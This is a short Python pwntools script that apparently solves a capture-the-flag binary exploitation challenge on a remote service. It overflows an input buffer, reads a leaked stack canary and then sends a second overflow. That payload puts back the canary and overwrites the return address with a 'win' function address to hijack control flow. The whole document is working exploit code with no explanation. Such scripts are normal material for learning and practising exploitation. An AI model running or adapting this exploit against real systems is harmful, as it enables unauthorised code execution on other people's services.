from pwn import *
value=0x41424344
winaddr=0x401276

r=remote("10.45.1.2", 3003)
context.log_level="debug"
r.sendlineafter(b"Choice: ", b'1')
r.recvuntil(b"Enter your name: ")
r.sendline(b'a'*32+p64(value)+b'b'*8)
r.recvuntil(b"Choice: ")
r.sendline(b'2')
r.recvuntil("Regalino: ")
canary=p64(int(r.recvuntil(b'\n',drop=True),16))
print(canary)
r.recvuntil(b"Choice: ")
r.sendline(b'3')
r.recvuntil(b"Enter feedback: ")
r.sendline(b'a'*24+canary+b'b'*8+p64(winaddr))
r.interactive()